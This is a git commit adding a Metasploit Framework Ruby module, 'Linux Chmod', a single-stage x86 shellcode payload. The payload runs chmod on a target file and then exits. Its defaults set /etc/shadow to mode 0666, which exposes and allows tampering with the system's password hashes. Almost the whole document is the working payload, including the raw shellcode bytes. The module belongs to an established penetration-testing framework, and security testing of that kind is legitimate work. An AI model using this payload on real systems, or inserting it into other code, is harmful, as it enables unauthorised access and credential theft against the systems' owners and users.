cfaa70cf30c17ebab0eff43c4d4da2fa0529bb4f
HD Moore <hd_moore@rapid7.com>
2008-03-10 21:21:51 +0000

    New chmod payload from Kris Katterjohn
    git-svn-id: file:///home/svn/framework3/trunk@5439 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/singles/linux/x86/chmod.rb
@@ -0,0 +1,49 @@
+require 'msf/core'
+
+module Msf
+module Payloads
+module Singles
+module Linux
+module X86
+
+###
+#  Linux Chmod(file, mode)
+#
+#  Kris Katterjohn - 03/03/2008
+###
+module Chmod
+	include Msf::Payload::Single
+	include Msf::Payload::Linux
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'        => 'Linux Chmod',
+			'Version'     => '1',
+			'Description' => 'Runs chmod on specified file with specified mode',
+			'Author'      => 'Kris Katterjohn <katterjohn@gmail.com>',
+			'License'     => BSD_LICENSE,
+			'Platform'    => 'linux',
+			'Arch'        => ARCH_X86))
+
+		register_options(
+			[
+				OptString.new('FILE', [ true, "Filename to chmod", "/etc/shadow" ]),
+				OptString.new('MODE', [ true, "File mode (octal)", "0666" ]),
+			], Msf::Payloads::Singles::Linux::X86::Chmod)
+	end
+
+	# Dynamically generates chmod(FILE, MODE) + exit()
+	def generate_stage
+		file    = datastore['FILE'] || '/etc/shadow'
+		mode	= (datastore['MODE'] || "0666").oct
+
+		payload	=
+			"\x99\x6a\x0f\x58\x52" +
+			Rex::Arch::X86.call(file.length + 1) + file + "\x00" +
+			"\x5b" + Rex::Arch::X86.push_dword(mode) +
+			"\x59\xcd\x80\x6a\x01\x58\xcd\x80";
+	end
+end
+
+end end end end end
+
